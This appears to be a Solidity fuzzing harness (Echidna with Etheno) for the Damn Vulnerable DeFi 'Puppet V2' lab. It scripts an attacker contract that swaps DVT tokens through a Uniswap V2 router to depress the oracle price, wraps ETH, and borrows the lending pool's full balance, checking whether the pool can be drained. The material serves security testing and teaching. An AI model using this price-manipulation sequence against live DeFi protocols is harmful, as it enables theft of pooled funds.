// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "../../DamnValuableToken.sol";
import "../../_helpers/Debugger.sol";
import "./IPupperV2Pool.sol";
import "./IWETH9.sol";

contract EchidnaEthenoPuppetV2 {
    bool immutable DEBUGGING_ENABLED = true;
    bool private initialized;
    uint256 ATTACKER_INITIAL_TOKEN_BALANCE = 10_000 ether;

    address constant TOKEN_ADDR = 0x1dC4c1cEFEF38a777b15aA20260a54E584b16C48;
    address constant WETH9_ADDR = 0x1D7022f5B17d2F8B695918FB48fa1089C9f85401;
    address constant ROUTER_ADDR = 0x0B1ba0af832d7C05fD64161E0Db78E85978E8082;
    address constant POOL_ADDR = 0x25B8Fe1DE9dAf8BA351890744FF28cf7dFa8f5e3;
    address constant ATTACKER_ADDR = 0x6Ecbe1DB9EF729CBe972C83Fb886247691Fb6beb;

    IPuppetV2Pool pool;
    DamnValuableToken token;
    IWETH9 weth;
    IUniswapV2Router02 router;

    constructor() {
        require(
            msg.sender == ATTACKER_ADDR,
            "Only attacker can deploy the contract"
        );
        pool = IPuppetV2Pool(POOL_ADDR);
        token = DamnValuableToken(TOKEN_ADDR);
        weth = IWETH9(WETH9_ADDR);
        router = IUniswapV2Router02(ROUTER_ADDR);
        // check that etheno setup is correct
        require(
            token.balanceOf(ATTACKER_ADDR) == ATTACKER_INITIAL_TOKEN_BALANCE,
            "Wrong setup: Not enough tokens"
        );
        require(
            address(ATTACKER_ADDR).balance <= 20 ether,
            "Wrong setup: More ETH than expected"
        );
        // approve attacker's token to this contract
        // bool successApprove = token.approve(address(this), type(uint256).max);
        // require(successApprove, "Approval unsuccessful");
    }

    receive() external payable {}

    /**
     * @notice transfer all DVT tokens from the attacker to this contract
     * @dev setup function which can be called only once
     */
    function transferDVTToThisContract() external {
        require(!initialized, "Contract already initialized");
        require(
            msg.sender == ATTACKER_ADDR,
            "Only attacker can call this function"
        );
        require(
            token.balanceOf(ATTACKER_ADDR) >= ATTACKER_INITIAL_TOKEN_BALANCE,
            "Not enough tokens"
        );
        initialized = true;
        token.transferFrom(
            ATTACKER_ADDR,
            address(this),
            ATTACKER_INITIAL_TOKEN_BALANCE
        );
        //
        assert(
            token.balanceOf(address(this)) >= ATTACKER_INITIAL_TOKEN_BALANCE
        );
    }

    /**
     * @notice swap DVT tokens for ETH
     * @param _amount amount of DVT tokens to be swapped
     */
    function swapDvtForEth(uint256 _amount) external {
        // PRECONDITIONS
        uint256 tokenBalance = token.balanceOf(address(this));
        require(tokenBalance > 0, "Amount cannot be 0");
        require(tokenBalance >= _amount, "Unsufficient amount");
        // set path
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        // approve router
        uint256 _allowance = token.allowance(address(this), address(router));
        if (_allowance < _amount) {
            bool successAproval = token.approve(
                address(router),
                type(uint256).max
            );
            require(successAproval, "Approval not successful");
        }
        // logging purposes
        uint256 ethBalance = address(this).balance;
        uint256 priceBefore = pool.calculateDepositOfWETHRequired(
            token.balanceOf(address(pool))
        );
        // ACTION: swap amount of dvt to eth
        router.swapExactTokensForETH(
            _amount,
            0,
            path,
            address(this),
            type(uint256).max
        );
        // logging purposes
        uint256 priceAfter = pool.calculateDepositOfWETHRequired(
            token.balanceOf(address(pool))
        );
        // DEBUGGING
        if (DEBUGGING_ENABLED) {
            Debugger.log("Msg.sender:", address(msg.sender));
            Debugger.log("Amount of DVT to swap:", _amount);
            Debugger.log(
                "DVT Balance of attacker before (address(this)):",
                tokenBalance
            );
            Debugger.log(
                "DVT Balance of attacker after:",
                token.balanceOf(address(this))
            );
            Debugger.log("Allowance", _allowance);
            Debugger.log("Eth Balance before:", ethBalance);
            Debugger.log("Eth Balance after:", address(this).balance);
            Debugger.log("priceBefore", priceBefore);
            Debugger.log("priceAfter", priceAfter);
        }
        // POSTCONDITIONS
        assert(tokenBalance > token.balanceOf(address(this)));
        assert(ethBalance < address(address(this)).balance);
        assert(priceAfter < priceBefore);
    }

    // /**
    //  * @notice swap all DVT tokens of this contract to ETH
    //  */
    // function swapAllDvtForEth() external {
    //     // PRECONDITIONS
    //     uint256 tokenBalance = token.balanceOf(address(this));
    //     require(tokenBalance > 0, "Amount cannot be 0");
    //     // set path
    //     address[] memory path = new address[](2);
    //     path[0] = address(token);
    //     path[1] = address(weth);
    //     // approve router
    //     uint256 _allowance = token.allowance(address(this), address(router));
    //     if (_allowance < tokenBalance) {
    //         bool successAproval = token.approve(
    //             address(router),
    //             type(uint256).max
    //         );
    //         require(successAproval, "Approval not successful");
    //     }
    //     // logging purposes / assertion
    //     uint256 ethBalance = address(this).balance;
    //     uint256 priceBefore = pool.calculateDepositOfWETHRequired(
    //         token.balanceOf(address(pool))
    //     );
    //     // ACTION: swap dvt to eth
    //     router.swapExactTokensForETH(
    //         tokenBalance,
    //         0,
    //         path,
    //         address(this),
    //         type(uint256).max
    //     );
    //     uint256 priceAfter = pool.calculateDepositOfWETHRequired(
    //         token.balanceOf(address(pool))
    //     );
    //     // debugging
    //     if (DEBUGGING_ENABLED) {
    //         Debugger.log("Msg.sender:", address(msg.sender));
    //         Debugger.log(
    //             "DVT Balance of attacker before (address(this)):",
    //             tokenBalance
    //         );
    //         Debugger.log(
    //             "DVT Balance of attacker after:",
    //             token.balanceOf(address(this))
    //         );
    //         Debugger.log("Allowance", _allowance);
    //         Debugger.log("Eth Balance before:", ethBalance);
    //         Debugger.log("Eth Balance after:", address(this).balance);
    //         Debugger.log("priceBefore", priceBefore);
    //         Debugger.log("priceAfter", priceAfter);
    //     }
    //     // POSTCONDITIONS
    //     assert(tokenBalance > token.balanceOf(address(this)));
    //     assert(ethBalance < address(address(this)).balance);
    //     assert(priceAfter < priceBefore);
    // }

    /**
     * @notice deposit ETH to WETH
     * @dev based on the scenario; attacker owns 20 ETH in his/her EOA
     */
    function depositEthToWeth() external payable {
        // PRECONDITIONS
        require(msg.sender == ATTACKER_ADDR, "depositEthToWeth:Wrong account");
        require(msg.value > 0, "Out of scenario's range");
        // require(msg.value > 0 && address(ATTACKER_ADDR).balance >= msg.value, "Out of scenario's range"); // this was added as Echidna was able to deposit more ETH than attacker actually had
        uint256 wethBalanceBefore = weth.balanceOf(address(this));
        // ACTION: deposit ETH and get WETH
        weth.deposit{value: msg.value}();
        // DEBUGGING
        if (DEBUGGING_ENABLED) {
            Debugger.log("Msg.value:", msg.value);
            Debugger.log("wethBalanceBefore:", wethBalanceBefore);
            Debugger.log("wethBalanceAfter:", weth.balanceOf(address(this)));
        }
        // POSTCONDITIONS
        assert(weth.balanceOf(address(this)) > wethBalanceBefore);
    }

    /**
     * @notice test borrow DVT tokens from Puppet-V2 pool
     * @dev INVARIANT: can be the puppet pool drained to zero?
     * TODO: split this function into borrow function with a parameter (ammount to borrow)
     *  and test invariant function?
     */
    function testBorrowDvtFromPool() external {
        // PRECONDITIONS
        uint256 poolBalance = token.balanceOf(address(pool));
        uint256 senderWethBalance = weth.balanceOf(address(this));
        uint256 wethDepositRequired = pool.calculateDepositOfWETHRequired(
            poolBalance
        );
        require(
            senderWethBalance >= wethDepositRequired,
            "Not enough WETH to borrow DVT"
        );
        // ACTIONS
        // approval
        bool approvalSucess = weth.approve(address(pool), wethDepositRequired);
        require(approvalSucess, "WETH Approval unsuccessful");
        // borrow
        uint256 attackerTokenBalanceBefore = token.balanceOf(address(this));
        pool.borrow(poolBalance);
        // debugging
        if (DEBUGGING_ENABLED) {
            Debugger.log("wethDepositRequired:", wethDepositRequired);
            Debugger.log("senderWethBalanceBefore:", senderWethBalance);
            Debugger.log(
                "senderWethBalanceAfter:",
                weth.balanceOf(address(this))
            );
            Debugger.log("initPoolBalanceBefore:", poolBalance);
            Debugger.log(
                "initPoolBalanceAfter:",
                token.balanceOf(address(token))
            );
            Debugger.log("userTokenBalanceBefore:", attackerTokenBalanceBefore);
            Debugger.log(
                "userTokenBalanceAfter:",
                token.balanceOf(address(address(this)))
            );
        }
        // POSTCONDITIONS
        assert(token.balanceOf(address(this)) > attackerTokenBalanceBefore);
        // INVARIANT
        assert(token.balanceOf(address(pool)) > 0);
    }
}
